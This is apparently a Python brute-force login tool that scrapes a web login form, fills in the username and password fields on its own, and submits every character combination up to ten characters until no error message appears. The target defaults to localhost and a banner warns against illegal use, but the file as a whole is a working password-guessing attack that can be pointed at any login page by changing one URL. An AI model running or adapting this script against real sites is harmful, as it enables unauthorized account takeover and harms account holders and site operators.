#########################################################
# BRUTEFORCE
#
# @author       prod3v3loper
# @copyright    (c) 2024, prod3v3loper
# @package      Brutforce
# @subpackage   Website
# @version      1.0
# @since        1.0
# @link         https://www.prod3v3loper.com
#
#########################################################
import string
import itertools
import time
import requests
from requests.exceptions import Timeout, RequestException
from datetime import datetime
from bs4 import BeautifulSoup

# ANSI color codes for the console output
BLUE = "\033[34m"
RED = "\033[31m"
RESET = "\033[0m"

# Constants for the login page, error messages, and debugging
EMAIL = "email@localhost"
LOGIN_URL = "http://localhost:8000/login/"
ERROR_DIV_CLASS = "error-message"
MAX_PASS_LENGTH = 10
RESPONSE_DELAY = 1
DEBUG_FORM = True  # Set this to True to print form debugging information
DEBUG_FORM_LENGTH = 1000  # Set this to True to print form debugging information

# Use session to maintain persistent connections and headers across requests
session = requests.Session()

# Function to dynamically detect and fill out the form
def dynamic_login(username, password):
    try:
        # Perform an initial GET request to get the form
        response = session.get(LOGIN_URL, timeout=10)
        time.sleep(RESPONSE_DELAY)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find the first form on the page
        form = soup.find("form")
        if not form:
            print("No form found.")
            return False

        # Extract the action URL for the form submission
        action_url = form.get("action", LOGIN_URL)
        if not action_url.startswith("http"):
            action_url = requests.compat.urljoin(LOGIN_URL, action_url)

        # Extract all input fields from the form
        inputs = form.find_all("input")
        data = {}

        for input_field in inputs:
            name = input_field.get("name")
            if not name:
                continue  # Skips fields without names

            # For hidden or other fields, retain the default value
            value = input_field.get("value", "")

            # Set known values for username and password
            if "user" in name.lower():
                data[name] = username
            elif "pass" in name.lower():
                data[name] = password
            else:
                data[name] = value

        # Send the POST request with the extracted form data
        response = session.post(action_url, data=data, allow_redirects=True, timeout=10)
        # Debug output for status code and final URL
        print(f"Status Code: {response.status_code}, Final URL: {response.url}")
        # Add a delay to ensure the response is fully processed (if required)
        time.sleep(RESPONSE_DELAY)

        # Print the form HTML content if debugging is enabled
        if DEBUG_FORM and form:
            print("\nForm HTML Content:")
            print(form.prettify()[:DEBUG_FORM_LENGTH])  # Adjust the amount of content as needed

        # Parse the response to check for error messages
        soup = BeautifulSoup(response.text, 'html.parser')
        error_divs = soup.find_all("div", class_=ERROR_DIV_CLASS)

        # Print the error message, if found
        if error_divs:
            for i, error_div in enumerate(error_divs, start=1):
                print(f"Error Div {i}: {error_div.get_text(strip=True)}")
            return False
        else:
            print("Login successful or different error class.")
            return True
        
    except Timeout:
        print("Request timed out")
        return False
    
    except RequestException as e:
        print(f"An error occurred: {e}")
        return False

# Generator function to produce combinations of passwords
def generate_combinations(max_length=10):
    # Character sets: lowercase letters, uppercase letters, numbers, special characters
    characters = string.ascii_letters + string.digits + string.punctuation

    length = 1
    # A set to ensure that each combination is only created once
    generated_combinations = set()

    while length <= max_length:
        # Systematic generation of all combinations for the current length
        all_combos = list(itertools.product(characters, repeat=length))
        for combo in all_combos:
            combo_string = ''.join(combo)
            # Generate all permutations for the current combination
            if combo_string not in generated_combinations:
                all_permutations = set(itertools.permutations(combo_string))
                for perm in all_permutations:
                    perm_string = ''.join(perm)
                    if perm_string not in generated_combinations:
                        yield perm_string
                        generated_combinations.add(perm_string)

        # Increase the length for the next round of combinations
        length += 1

# Function to perform brute force login attempts
def brute_force_login(username):
    # Print a header with colored output
    print(f"{BLUE}/*{'-' * 85}*/")
    print("/*{:^85}*/".format("BRUTEFORCE ATTACK"))
    print(f"/*{'-' * 85}*/")
    print("{}/*{:^85}*/".format(RED, "Don't use for illegal activities"))
    print(f"{RESET}/*{'-' * 85}*/\n")

    # Record the start time and initialize the attempt counter
    start_time = datetime.now()
    tries = 0

    # Iterate over generated password combinations
    for guess_password in generate_combinations(MAX_PASS_LENGTH):
        tries += 1
        print(f"Test combination: {username} {guess_password}")

        # If the login attempt is successful, print the results
        if dynamic_login(username, guess_password):
            elapsed_time = datetime.now() - start_time
            elapsed_ms = elapsed_time.total_seconds() * 1000

            print(f"{BLUE}\n/*{'-' * 85}*/")
            print("/*{:^85}*/".format("PASSWORD FOUND"))
            print(f"/*{'-' * 85}*/")
            print("/*{:^20}|{:^21}|{:^21}|{:^20}*/".format(
                "Time (ms)", "Tries", "Name", "Password"))
            print("/*{:^20}|{:^21}|{:^21}|{:^20}*/".format(
                f"{elapsed_ms:.3f}", tries, username, guess_password))
            print(f"/*{'-' * 85}*/{RESET}")

            return guess_password

        # Extra delay between attempts
        # time.sleep(1)

        # Limit output
        if len(guess_password) > MAX_PASS_LENGTH:
            break

    print("No password found")
    return None

# Example call to the brute force function
brute_force_login(EMAIL)
